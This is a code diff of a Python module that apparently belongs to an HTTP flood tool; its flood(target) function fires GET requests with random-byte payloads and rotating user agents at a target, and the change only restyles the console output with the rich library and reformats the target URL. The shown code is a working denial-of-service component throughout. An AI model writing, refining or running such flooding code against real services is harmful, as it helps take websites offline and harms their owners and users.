@@ -1,12 +1,14 @@
-import requests
 import random
+import requests
+from rich.console import Console
 from bin.addons.utils import random_useragent
-from stringcolor import *
 
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+yellow = "yellow1"
 
-red = "#ff0033"
-green = "#02f93c"
-yellow = "#eefc32"
 
 # Load user agents
 user_agents = []
@@ -27,14 +29,17 @@ headers = {
 def flood(target):
     payload = str(random._urandom(random.randint(10, 150)))
     try:
-        r = requests.get(target, params=payload, headers=headers, timeout=4)
+        r = requests.get(
+            f"http://{target[0]}", params=payload, headers=headers, timeout=4
+        )
     except requests.exceptions.ConnectTimeout:
-        print(f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Timed out', yellow)}")
+        print(f"[{red} bold]✘ ERROR [/{red} bold][{yellow}]Timed out[/{yellow}]")
     except Exception as e:
         print(
-            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('While sending GET request', yellow)}"
+            f"[{red} bold]✘ ERROR [/{red} bold] [{yellow}]While sending GET request[/{yellow}]"
         )
     else:
         print(
-            f"{cs(f'[{r.status_code}]', green)} {cs(f'Request sent! Payload size: {len(payload)}', yellow)}"
+            f"[{green} bold][{r.status_code}][/{green} bold]"
+            + f"[{yellow}]Request sent! Payload size: {len(payload)}[/{yellow}]"
         )
